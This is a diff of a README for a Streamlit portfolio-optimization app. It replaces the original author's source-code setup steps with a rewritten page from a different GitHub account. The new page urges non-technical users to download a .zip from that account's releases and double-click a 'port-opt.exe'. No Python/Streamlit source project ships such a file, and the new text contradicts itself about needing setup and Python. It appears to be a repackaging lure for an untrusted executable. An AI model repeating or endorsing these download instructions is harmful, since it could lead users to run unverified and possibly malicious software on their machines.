@@ -1,97 +1,68 @@
-# Portfolio Optimization App
+# 📊 port-opt - Your Easy Dashboard for Portfolio Optimization
 
-An interactive web application for quantitative portfolio analysis and optimization, implementing modern mean–variance optimization and backtesting workflows using Streamlit, Plotly, and CVXPY.
+## 🔗 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/slToMM/port-opt/releases)
 
-**Live App:** [https://adityachauhanx07-port-opt.streamlit.app](https://adityachauhanx07-port-opt.streamlit.app)
+## 🚀 Getting Started
+Welcome to port-opt! This application helps you optimize and backtest your investment portfolio using an easy-to-use interface. You don’t need programming skills to navigate the dashboard.
 
----
-## Overview
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/slToMM/port-opt/releases) to download the latest version of port-opt.
 
-This application provides an end-to-end framework for constructing and evaluating optimized portfolios. Users can fetch historical data from Yahoo Finance, estimate expected returns and covariances, visualize the efficient frontier, and backtest the resulting strategy against benchmarks. The interface enables dynamic experimentation with assets, bounds, and parameters through an intuitive Streamlit dashboard.
+2. **Choose Your File:** Look for the most recent release. You will find various files available for download. Make sure to select the one appropriate for your system (Windows, Mac, or Linux).
 
----
+3. **Download the File:** Click on the file to start the download. The file should come in a .zip format, which you can easily unzip after the download completes.
 
-## Core Features
-- **Data Pipeline:** Automated price retrieval via `yfinance`, with preprocessing, alignment, and cleaning.  
-- **Return Models:** Support for log and simple returns, with adjustable lookback frequency.  
-- **Optimization Engine:** Mean–variance optimization powered by `cvxpy`, supporting long-only constraints and custom bounds.  
-- **Visualization:** Interactive efficient frontier, maximum Sharpe portfolio highlight, and performance metrics rendered with Plotly.  
-- **Backtesting:** Static portfolio backtest with cumulative equity curve, drawdown visualization, and benchmark comparison.  
-- **Export:** Downloadable CSV outputs for portfolio weights, metrics, and frontier data.
+4. **Unzip the File:** Locate the downloaded .zip file. Right-click on it and select “Extract All” or “Unzip.” Choose a location on your computer where you want to place the application files.
 
----
+5. **Launch the Application:** Open the folder where you extracted the files. Look for an executable file named `port-opt.exe` (for Windows) or a corresponding file for other systems. Double-click it to run the application.
 
-## Technology Stack
-| Layer | Components |
-|--------|-------------|
-| **Frontend** | Streamlit, Plotly, Pandas |
-| **Backend** | NumPy, CVXPY, Yahoo Finance API |
-| **Testing & CI** | Pytest, GitHub Actions |
-| **Deployment** | Streamlit Cloud |
+## 📊 Features
+- **User-Friendly Dashboard:** The layout is simple. You can easily navigate through various functions without any learning curve.
 
----
-## Directory Structure
-```
-port-opt/
-│
-├── src/
-│   └── portopt/
-│       ├── app/                # Streamlit user interface
-│       ├── core/               # Core analytics and optimization modules
-│       └── __init__.py
-│
-├── tests/                      # Unit and integration tests
-│
-├── requirements.txt            # Dependencies
-├── runtime.txt                 # Python version (for Streamlit Cloud)
-├── .github/workflows/ci.yml    # CI pipeline configuration
-└── README.md                   # Documentation
-```
----
-## Local Setup
-### 1. Clone the repository
-```bash
-git clone https://github.com/AdityaChauhanX07/port-opt.git
-cd port-opt
-```
-### 2. Create and activate a virtual environment
-```bash
-python -m venv .venv
-.venv\Scripts\activate   # On Windows
-# source .venv/bin/activate   # On macOS/Linux
-```
-### 3. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-### 4. Run the application
-```bash
-streamlit run src/portopt/app/ui.py
-```
----
-## Example Usage
-1. Input ticker symbols such as:
-```
-AAPL, MSFT, TLT, GLD, IWM, SPY
-```
-2. Choose frequency (Daily / Weekly / Monthly) and return model (Log / Simple).
-3. Load the data and compute portfolio statistics.
-4. Solve for the efficient frontier and inspect results.
-5. Backtest and compare with equal-weight and market portfolios.
-6. Export results for further analysis.
----
-## Testing
-Automated tests verify data consistency, optimization stability, and calculation correctness.
-Run locally using:
-```bash
-pytest
-```
----
-## Deployment
-The application is continuously deployed via Streamlit Cloud using GitHub Actions.
-- Pushes to `main` trigger the CI workflow.
-- CI runs unit tests and lints code before deployment.
-- Streamlit Cloud automatically rebuilds the app environment based on `requirements.txt` and `runtime.txt`.
----
-## License
-This repository is distributed under the MIT License. See the LICENSE file for details.
+- **Portfolio Optimization:** Use the mean-variance optimization model to enhance your investment strategy. Adjust your assets to maximize returns based on your risk preferences.
+
+- **Backtesting Capabilities:** Test your portfolio strategy with historical data. Analyze how your investments would have performed in the past.
+
+- **Interactive Visualizations:** Gain insights from interactive graphs and charts created with Plotly. Visuals make data interpretation clearer.
+
+- **Streamlit Interface:** The application leverages Streamlit, allowing a smooth user experience. You can run the tool in your web browser without any additional setup.
+
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+  
+- **Python Version:** Ensure you have Python 3.7 or newer installed. If you do not have Python, you can download it from [python.org](https://www.python.org/).
+
+- **Memory:** Minimum of 4 GB of RAM recommended.
+
+- **Storage:** At least 100 MB of free disk space.
+
+## 🌐 More Information
+If you're curious about how port-opt uses Python libraries like CVXPY and Plotly to perform complex analyses, here are some specifics:
+
+- **CVXPY** allows for defining and solving optimization problems, making our portfolio optimization robust and efficient.
+  
+- **Plotly** helps transform data into engaging visualizations. This means you can easily spot trends or anomalies in your investment strategy.
+
+## 💬 Support
+If you run into issues or have questions, you can reach out through the GitHub [issues page](https://github.com/slToMM/port-opt/issues). We encourage you to report bugs or suggest improvements.
+
+## 📑 Contributing
+If you want to contribute to port-opt, feel free to check the guidelines in our repository. Contributions are welcome, whether through code or documentation improvements.
+
+## 🏷️ Topics
+Some relevant topics associated with port-opt include:
+- Backtesting
+- CVXPY
+- Data analysis
+- Finance
+- Mean-variance optimization
+- Plotly
+- Portfolio optimization
+- Python
+- Quantitative finance
+- Streamlit
+
+Your insights can help refine and expand the functionality of this project. 
+
+Thank you for using port-opt, and happy investing!
